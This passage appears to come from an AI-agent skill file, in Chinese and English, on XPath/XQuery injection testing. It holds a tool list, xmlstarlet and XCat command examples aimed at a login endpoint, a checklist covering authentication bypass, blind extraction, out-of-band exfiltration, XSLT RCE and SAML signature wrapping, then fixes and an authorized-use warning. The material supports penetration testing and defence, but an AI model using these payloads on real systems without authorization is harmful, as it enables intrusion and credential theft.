| xmlstarlet | 命令行XPath查询验证（本地样本） |
| Oxygen XML / BaseX GUI | XPath/XQuery表达式调试 |
| basex（本地服务） | XQuery注入本地复现环境 |
| SAML Burp扩展（SAML Raider） | SAML断言修改、XSW测试、重放 |
| Python requests脚本（见5.6） | 自定义盲注提取 |

```
# xmlstarlet 本地验证payload效果
echo '<users><user><name>admin</name><pass>abc</pass></user></users>' > t.xml
xmlstarlet sel -t -v "//user[name='' or '1'='1' and pass='x']" t.xml

# XCat（POST盲注示例）
xcat -m POST -t "<user><user>u</user><pass>p</pass></user>" \
  http://target.com/login user=u pass=p -c "//user"
```

## 十五、测试检查清单

### 15.1 发现与确认
- [ ] 识别所有XPath求值入口（登录/搜索/查询/权限/SAML解析/XSLT参数）
- [ ] 单引号/双引号闭合测试（语法错误/空响应）
- [ ] 布尔差异确认注入（`' or '1'='1` vs 正常输入）
- [ ] 数字上下文测试（`1 or 1=1`）
- [ ] 属性上下文测试（`'] | //* | foo['`）

### 15.2 认证与逻辑
- [ ] 永真条件认证绕过（经典/双引号/谓词注入三形态）
- [ ] 权限字段提取（首个返回节点的role/isAdmin）
- [ ] 越权读取其他用户数据

### 15.3 数据提取
- [ ] 节点枚举（*/node()/text()/comment()/@*）
- [ ] 根节点/节点名指纹（name()/starts-with）
- [ ] `|`联合多路径输出
- [ ] 布尔盲注长度二分提取
- [ ] 布尔盲注字符集二分提取
- [ ] 位运算/码点提取（XPath 2.0）
- [ ] string-join批量拼接输出
- [ ] XPath 2.0函数（doc()/unparsed-text()/collection()）文件读取
- [ ] 时间盲注（doc()不可达地址/大计算）
- [ ] OAST外带（DNS/HTTP监听）

### 15.4 高级面
- [ ] XQuery注入（BaseX/eXist/MarkLogic REST或参数）
- [ ] FLWOR表达式注入与批量导出
- [ ] XXE/XInclude联动（XML结构注入点）
- [ ] XSLT扩展函数RCE
- [ ] 现代语言库差异适配（lxml/PHP/.NET/Java参数化差异）

### 15.5 业务/协议面
- [ ] SAML断言解析XPath注入（NameID/Attribute）
- [ ] SAML文档级XPath缺陷测试（CVE-2026-18092模式）
- [ ] XSW签名包装测试（副本断言/双根/ID重用）
- [ ] 属性提权（role注入）

### 15.6 绕过与纵深
- [ ] XML实体编码/URL编码绕过
- [ ] 等价表达式（true()/not(not())/translate/concat/codepoints）
- [ ] 空白打散（空格/TAB/换行）
- [ ] 命名空间local-name()绕过
- [ ] 流量层绕过（chunked/Content-Type/压缩）
- [ ] 错误信息泄露收集（堆栈/库版本）

## 十六、修复建议

- **参数化XPath（根治）**：查询骨架与数据分离——Java用`XPathVariableResolver`，lxml用`$var`绑定，XQuery用`declare variable $x external`，.NET用`XsltArgumentList`；无参数化能力时（PHP DOMXPath）用预编译查询+严格转义
- **输入白名单校验**：用户名/ID按业务格式白名单（`^[a-zA-Z0-9_.-]{1,64}$`），拒绝XPath元字符
- **转义兜底**：单引号替换为`&apos;`（OWASP推荐），双引号替换为`&quot;`；注意同时处理`[`、`]`等结构字符
- **禁用危险函数**：XPath/XSLT处理器禁用`doc()`/`document()`/`unparsed-text()`/`collection()`；XSLT禁用扩展函数（Java/PHP/.NET扩展）
- **安全解析器配置**：禁用XXE（`DOCTYPE`）、禁用XInclude；XML解析器feature安全化（如Java `XMLConstants.FEATURE_SECURE_PROCESSING`+`ACCESS_EXTERNAL_DTD`）
- **XSLT沙箱**：安全模式运行、限制加载协议（file/http）、最小权限账户
- **SAML专项**：身份字段必须从签名覆盖子树内提取（禁止文档级`//`XPath取第一个）；签名验证与业务处理用同一解析器/视图；校验断言唯一性防重放
- **错误处理**：统一错误页，不返回XPath异常堆栈与查询片段
- **最小权限**：运行XQuery/XSLT的账户低权限；XML数据库按用户隔离集合
- **WAF纵深**：拦截XPath元字符组合+等价表达式特征；对SAML/XML参数单独解码后检测

## 注意事项

- **仅限授权测试**：XPath注入可直接读取XML中的敏感配置、凭据、密钥与用户数据，仅可在获得书面授权的目标系统上测试；遵守《网络安全法》及当地法规，未授权测试属违法行为
- **影响最小化**：优先使用布尔/OAST等无破坏性手段；盲注提取注意限速与并发控制，避免拖垮XML数据库
- **数据保护**：提取到的凭据/私钥仅用于授权验证，不扩散、不上传公网
- **XPath版本差异**：1.0与2.0/3.1功能差异极大，2.0+的doc()/unparsed-text()/maps是高危增强；先指纹实现再选Payload
- **XSLT/XQuery RCE**：用户可控样式表或XML数据库扩展可达RCE（如CVE-2026-44962），验证RCE前务必确认授权与影响范围
- **SAML测试谨慎**：XSW与断言注入影响SSO全局信任，仅在隔离的测试IdP/SP环境验证
- **清理痕迹**：测试结束删除写入的配置节点、测试断言与临时文件
- **情报更新**：跟踪OWASP/CWE-643/CWE-652与SAML库安全公告（ruby-saml、simplesamlphp、Net::SAML2、samlify），及时更新本技能

## DECISION TREE

```
XPath 注入点确认（输入进入 xpath.evaluate/SelectNodes 拼接）？
├── 认证绕过（登录面）→ tautology 注入 `' or '1'='1` / 括号闭合差分还原路径表达式
├── 数据提取（查询面）→ 节点枚举 → 位运算/字符集二分高效提取
├── 盲注（无回显）→ 布尔差分 / 超时外带（exist:timing）/ OAST
├── XPath 2.0+/XQuery 后端 → 版本差异路由（BaseX/eXist/MarkLogic 注入面）
├── XML 处理管线共存 → XXE/XInclude 联动（xxe 细分包）
├── XSLT 处理可达 → xslt-injection 细分包承接 RCE 升级
├── SAML 断言处理 → XSW 签名包装（saml-sso-assertion-attacks 细分包）
└── 全部失败 → 记录注入点与后端引擎差异，按未复现报告
```

## TARGET TOOL ADAPTATION

Use visible `http-framework-test` for baseline/probe comparison, `nuclei` only with a narrowly selected relevant template, and `execute-python-script` for controlled boolean-differential mutation. Do not assume a repeater or API-fuzzer MCP exists.

## RELATED ROUTING

- [ldap-injection](../ldap-injection-testing/SKILL.md) — LDAP injection shares the same query-manipulation patterns as XPath injection
- [sqli](../sqli-sql-injection/SKILL.md) — SQL injection is the relational analogue; boolean-blind and auth-bypass techniques transfer
- [xxe](../xxe-xml-external-entity/SKILL.md) — both target XML-processing pipelines in the application
- [xslt-injection](../xslt-injection/SKILL.md) — XSLT 调用函数/扩展对象可从 XPath 注入面升级为 RCE
- [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) — XPath 注入面在 SAML 断言处理中可升级为 XSW 签名包装
- [authentication-bypass](../authbypass-authentication-flaws/SKILL.md) — XPath tautology bypass (`' or '1'='1`) is a core auth bypass method
